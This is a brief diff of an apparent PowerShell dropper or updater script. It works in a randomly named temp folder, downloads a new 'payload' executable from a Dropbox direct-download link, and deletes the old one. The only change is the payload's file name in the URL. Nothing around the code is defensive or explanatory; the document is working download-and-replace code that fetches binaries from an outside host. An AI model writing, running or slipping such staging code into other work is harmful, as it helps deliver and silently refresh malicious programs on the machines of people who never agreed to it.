@@ -2,7 +2,7 @@
 cd $env:temp/sVBXKuz
 
 #download updated payload
-Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/bhb8pi9rfq842p65huhm1/wsappa.exe?rlkey=irp8lxs94i02sjm59z6vjt4vq&dl=0" -OutFile new_wsappa.exe
+Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/bhb8pi9rfq842p65huhm1/wsappa-1.2.exe?rlkey=irp8lxs94i02sjm59z6vjt4vq&dl=0" -OutFile new_wsappa.exe
 
 #remove old payload
 remove-item wsappa.exe
